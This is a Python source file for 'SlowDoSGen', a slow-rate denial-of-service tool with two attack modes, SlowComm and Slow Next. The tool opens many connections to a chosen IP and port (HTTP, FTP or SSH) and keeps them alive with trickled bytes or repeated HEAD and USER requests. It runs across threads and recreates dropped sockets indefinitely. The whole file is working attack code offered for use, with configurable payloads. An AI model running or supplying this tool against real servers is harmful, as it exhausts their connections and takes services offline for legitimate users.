import argparse
import threading
import socket
import random
import time
import sys
import os
import string

parser = argparse.ArgumentParser(description='A tutorial of SlowDoSGen')
parser.add_argument('-a', '--attack', required=True, metavar='', type=str, help='C = Slowcomm OR N = Slow Next')
parser.add_argument('-ip', '--ipaddress', required=True, metavar='', type=str, help='target IP address or URL')
parser.add_argument('-c', '--connection', required=True, metavar='', type=int, help='number of connections to be established')
parser.add_argument('-p', '--port', required=True, metavar='', type=int, help='destination port')
parser.add_argument('-l', '--payload', required=False, metavar='', type=str, help='load file with custom payload (enter name of file)')
parser.add_argument('-tc', '--threadCount', required=False, metavar='', default=5, type=int, help='number of threads to create (for Slow Next only)')
parser.add_argument('-t', '--timeout', required=False, metavar='', type=float, help='timeout sets how often are requests sent in cycle (for both attacks, by Slow Next max is 5 sec - see persistent connection)')
parser.add_argument('-t2', '--timeout_2', required=False, metavar='', default=1, type=float, help='timeout_2 sets how quickly are the threads started after each other (for Slow Next only)')
args = parser.parse_args()


# socket initiation for SlowNext attack ------------------------------------------------------------------------------------------
def init_socket_N(ip, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect((ip, port))
    s.send(payload)
    s.recv(350)
    return s

# socket initiation for SlowComm attack ------------------------------------------------------------------------------------------
def init_socket_C(ip, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ip, port))
    s.send(payload)
    return s

# Slowcomm attack ----------------------------------------------------------------------------------------------------------------
def slowcomm(ip, socket_count, port, timeout, payload):
    print("IP: {}".format(ip))
    print("Port: {}".format(port))
    print("Timeout: {}".format(timeout))
    print("Payload: {}".format(payload))
    print("Slowcomm - Attacking {} with {} sockets".format(ip, socket_count))
    #------------------------------------------------------------------------
    list_of_sockets = []
    print("Setting up the sockets...")
    for setsocket in range(socket_count):
        try:
            print(f"Creating socket number {setsocket}")
            s = init_socket_C(ip, port, payload)
        except socket.error:
            break
        list_of_sockets.append(s)

    if socket_count != len(list_of_sockets):
        print(f"\nServer could handle {len(list_of_sockets)} only")
    else:
        print(f"\n{len(list_of_sockets)} sockets succesfully created")
    
    i = 0
    print("\n")
    while True:
        list_of_sockets_ORIGINAL = list(list_of_sockets)
        print("Sending \"keep-alive\" payload...")
        for s in list(list_of_sockets_ORIGINAL):
            try:
                s.send(''.join(random.choice(string.ascii_lowercase) for i in range(1)).encode("utf-8"))
            except socket.error:
                print("Recreating socket...")
                list_of_sockets.remove(s)
                s_new = init_socket_C(ip, port, payload)
                if s_new:
                    list_of_sockets.append(s_new)
                    i = i + 1
        print(f"-> Recreated sockets: {i}")
        print(f"Total number of active sockets: {len(list_of_sockets)}")
        i = 0
        print(f"\nSleep - using Timeout {timeout} seconds")
        time.sleep(timeout)

# Slow Next algorithm
def slowNext(ip, socket_count, port, payload, keep_alive, timeout):
    list_of_sockets = []
    print(f"Thread \"{threading.current_thread().ident}\" running")
    
    # initializing connnections
    for _ in range(socket_count):
        try:
            s = init_socket_N(ip, port, payload)
        except socket.error:
            break
        list_of_sockets.append(s)

    time.sleep(0.5)
    
    # run loop for creating and maintaining open connections
    while True:
        list_of_sockets_ORIGINAL = list(list_of_sockets)
        for s in list(list_of_sockets_ORIGINAL):
            try:             
                s.send(keep_alive)
                s.recv(350)
            except socket.error:
                s.shutdown(2)
                s.close()
                list_of_sockets.remove(s)
                s_new = init_socket_N(ip, port, payload)
                if s_new:
                    list_of_sockets.append(s_new)
        time.sleep(timeout)

# prints Slow Nexts parameters   
def printSlowNextStats(ip, port, threadCount, socket_count, payload, keep_alive, timeout, timeout_2):
    print("IP: {}".format(ip))
    print("Port: {}".format(port))
    print("Number of threads used: {}".format(threadCount))
    print("Number of connections per thread: {}".format(socket_count))
    print("Payload: {}".format(payload))
    print("Keep_alive: {}".format(keep_alive))
    print("Timeout: {}".format(timeout))
    print("Timeout_2: {}".format(timeout_2))
    print("\nSlowNext - Attacking {} with {} sockets".format(ip, socket_count * threadCount))


# main ---------------------------------------------------------------------------------------------------------------------------
def main():
    # attack set
    attack = args.attack
    # ip set
    ip = args.ipaddress
    # port set
    port = args.port
    # payload set according to ports, services and attacks
    if not args.payload:
        if port == 80:
            if attack == "C":
                payload = f"HEAD / HTTP/1.1\r\n".encode("utf-8")
            elif attack == "N":
                payload = f"HEAD /index.html HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode("utf-8")
                keep_alive = f"HEAD /index.hmtl HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode("utf-8")
            else:
                print("You didn't enter appropriate parameters")
                exit()
        elif port == 21 or port == 22:
            if attack == "C":
                payload = f"USER {''.join(random.choice(string.ascii_lowercase) for i in range(5))}".encode("utf-8")
            else:
                payload = f"USER {''.join(random.choice(string.ascii_lowercase) for i in range(5))}\r\n".encode("utf-8")
                keep_alive = payload
    else:
        # setting paxload from file
        try:
            with open(os.path.join(sys.path[0], args.payload), "r") as f:
                all_lines = f.readlines()
                if (attack == 'N') and (port == 80):
                    # load first and second line
                    payload = all_lines[0].rstrip().replace("\\r\\n", "\r\n").encode("utf-8")
                    keep_alive = all_lines[1].rstrip().replace("\\r\\n", "\r\n").encode("utf-8")
                elif (attack == 'N') and (port == 21 or port == 22):
                    payload = all_lines[0].rstrip().replace("\\r\\n", "\r\n").encode("utf-8")
                    keep_alive = payload
                else:
                    payload = all_lines[0].rstrip().replace("\\r\\n", "\r\n").encode("utf-8")
                f.close()
        except IOError:
            print("File (payload or keep_alive payload) not accessible, try again")
            exit()
    # thread and timeout set 
    if attack == "C":
        # timeout for the break between sending next requests for Slowcomm
        if not args.timeout:
            timeout = 7
        else:
            timeout = args.timeout
    else:
        # timeout for the break between sending next requests for Slow Next
        if not args.timeout:
            timeout = 3.5
        else:
            timeout = args.timeout
    
    # initializing attacks according to entered parameters
    if attack == "C":
        slowcomm(ip, args.connection, port, timeout, payload)
    else:
        printSlowNextStats(ip, port, args.threadCount, args.connection, payload, keep_alive, timeout, args.timeout_2)
        i = 0
        start = time.perf_counter()
        for _ in range(args.threadCount):
            t = threading.Thread(target=slowNext, args=[ip, args.connection, port, payload, keep_alive, timeout])
            t.daemon = True
            t.start()
            i = i + 1
            time.sleep(args.timeout_2)
        
        finish = time.perf_counter()
        print(f"\n{i} threads created in {round(finish-start, 2)} second(s)")
        print("Attack in progress...")
        
        while True:
            time.sleep(3000)

if __name__ == "__main__":
    main()